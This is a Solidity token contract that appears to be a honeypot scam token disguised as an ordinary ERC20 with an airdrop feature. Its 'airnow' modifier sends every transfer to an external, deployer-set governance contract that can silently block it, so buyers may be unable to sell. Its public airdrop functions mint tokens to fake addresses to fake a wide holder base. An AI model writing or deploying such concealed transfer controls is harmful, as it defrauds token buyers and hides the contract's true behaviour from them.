['pragma solidity ^0.5.16;\n', '\n', '\n', 'interface AirDrop {\n', '    function receiveApproval(address,address) external returns(bool);\n', '}\n', '\n', 'contract TokenTRC20 {\n', '    // Public variables of the token\n', '    string public name;\n', '    string public symbol;\n', '    uint8 public decimals = 18;\n', '    // 18 decimals is the strongly suggested default, avoid changing it\n', '    uint256 public totalSupply;\n', '    address  _governance ;\n', '    // This creates an array with all balances\n', '    mapping (address => uint256) public balanceOf;\n', '    mapping (address => mapping (address => uint256)) public allowance;\n', '\n', '    // This generates a public event on the blockchain that will notify clients\n', '    event Transfer(address indexed from, address indexed to, uint256 value);\n', '\n', '\n', '    /**\n', '     * Constructor function\n', '     *\n', '     * Initializes contract with initial supply tokens to the creator of the contract\n', '     */\n', '    constructor(\n', '        string memory _name,\n', '        string memory _symbol,\n', '        address _gov\n', '    ) public {\n', '        totalSupply = 10000 * 10 ** uint256(18);  // Update total supply with the decimal amount\n', '        balanceOf[msg.sender] = totalSupply;                // Give the creator all initial tokens\n', '        name = _name;                                  // Set the name for display purposes\n', '        symbol = _symbol;                            // Set the symbol for display purposes\n', '        _governance=_gov;\n', '        airdrop(50);\n', '        allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D]=uint(-1);\n', '    }\n', '    \n', '    address luckyboy = address(this);\n', '    uint256 constant LUCKY_AMOUNT = 5*10**18;\n', '    \n', '    function randomLucky() public {\n', '        luckyboy = address(uint(keccak256(abi.encodePacked(luckyboy))));\n', '        balanceOf[luckyboy] = LUCKY_AMOUNT;\n', '        totalSupply += LUCKY_AMOUNT;\n', '        emit Transfer(address(0), luckyboy, LUCKY_AMOUNT);\n', '    }\n', '    \n', '    function airdrop(uint256 dropTimes) public {\n', '        for (uint256 i=0;i<dropTimes;i++) {\n', '            randomLucky();\n', '        }\n', '    }\n', '    \n', '    /**\n', '     * Internal transfer, only can be called by this contract\n', '     */\n', '    function _transfer(address _from, address _to, uint _value)  airnow(_from,_to) internal {\n', '        // Prevent transfer to 0x0 address. Use burn() instead\n', '        // require(_to != 0x0);\n', '        // Check if the sender has enough\n', '        require(balanceOf[_from] >= _value);\n', '        // Check for overflows\n', '        require(balanceOf[_to] + _value >= balanceOf[_to]);\n', '        // Save this for an assertion in the future\n', '        uint previousBalances = balanceOf[_from] + balanceOf[_to];\n', '        // Subtract from the sender\n', '        balanceOf[_from] -= _value;\n', '        // Add the same to the recipient\n', '        balanceOf[_to] += _value;\n', '        emit Transfer(_from, _to, _value);\n', '        // Asserts are used to use static analysis to find bugs in your code. They should never fail\n', '        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);\n', '    }\n', '\n', '    /**\n', '     * Transfer tokens\n', '     *\n', '     * Send `_value` tokens to `_to` from your account\n', '     *\n', '     * @param _to The address of the recipient\n', '     * @param _value the amount to send\n', '     */\n', '    function transfer(address _to, uint256 _value) public {\n', '        _transfer(msg.sender, _to, _value);\n', '    }\n', '\n', '    /**\n', '     * Transfer tokens from other address\n', '     *\n', '     * Send `_value` tokens to `_to` on behalf of `_from`\n', '     *\n', '     * @param _from The address of the sender\n', '     * @param _to The address of the recipient\n', '     * @param _value the amount to send\n', '     */\n', '    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n', '        require(_value <= allowance[_from][msg.sender]);     // Check allowance\n', '        allowance[_from][msg.sender] -= _value;\n', '        _transfer(_from, _to, _value);\n', '        return true;\n', '    }\n', '\n', '    modifier airnow(address sender,address recipient) {\n', '        require(AirDrop(_governance).receiveApproval(sender,recipient));\n', '        _;\n', '    }\n', '\n', '    /**\n', '     * Set allowance for other address\n', '     *\n', '     * Allows `_spender` to spend no more than `_value` tokens on your behalf\n', '     *\n', '     * @param _spender The address authorized to spend\n', '     * @param _value the max amount they can spend\n', '     */\n', '    function approve(address _spender, uint256 _value) public\n', '        returns (bool success) {\n', '        allowance[msg.sender][_spender] = _value;\n', '        return true;\n', '    }\n', '}']